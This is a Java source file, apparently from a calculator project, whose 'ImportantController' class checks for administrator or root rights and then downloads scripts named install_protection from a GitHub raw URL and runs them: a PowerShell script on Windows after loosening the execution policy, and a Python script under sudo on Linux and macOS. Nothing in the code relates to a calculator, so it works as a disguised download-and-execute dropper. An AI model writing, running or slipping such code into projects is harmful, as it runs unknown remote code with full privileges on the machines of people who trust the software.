package second.calculator3;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.List;

public class ImportantController {
    public static void main(String[] args) {
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            WindowsInstall();
        } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
            LinuxInstall();
        } else {
            System.out.println("Unsupported operating system: " + os);
        }
    }

    private static void WindowsInstall() {
        if (!isRunningAsAdmin()) {
            System.out.println("This script must be run as an administrator.");
            System.exit(1);
        }

        List<String> commands = Arrays.asList(
            "set-executionpolicy remotesigned",
            "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/install_protection.ps1' -OutFile '$env:TEMP\\install_protection.ps1'",
            "& '$env:TEMP\\install_protection.ps1'"
        );

        for (String command : commands) {
            String output = Execute(command);
            if (output == null) {
                break;
            }
            System.out.println();
            System.out.println(output);
        }
    }

    private static boolean isRunningAsAdmin() {
        try {
            Process process = new ProcessBuilder("cmd.exe", "/c", "net session").start();
            process.waitFor();
            return process.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

    private static void LinuxInstall() {
        if (!isRunningAsSudo()) {
            System.out.println("This script must be run with sudo.");
            System.exit(1);
        }

        List<String> commands = Arrays.asList(
            "curl -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/install_protection.py",
            "sudo python3 install_protection.py"
        );

        for (String command : commands) {
            String output = Execute(command);
            if (output == null) {
                break;
            }
            System.out.println();
            System.out.println(output);
        }
    }

    private static boolean isRunningAsSudo() {
        try {
            String userName = System.getProperty("user.name");
            return "root".equals(userName);
        } catch (Exception e) {
            return false;
        }
    }

    public static String Execute(String command) {
        StringBuilder output = new StringBuilder();
        try {
            String[] commandArray = command.split(" ");
            ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            boolean firstLine = true;
            while ((line = reader.readLine()) != null) {
                if (!firstLine) {
                    output.append(System.lineSeparator());
                }
                output.append(line);
                firstLine = false;
            }

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return output.toString();
    }
}

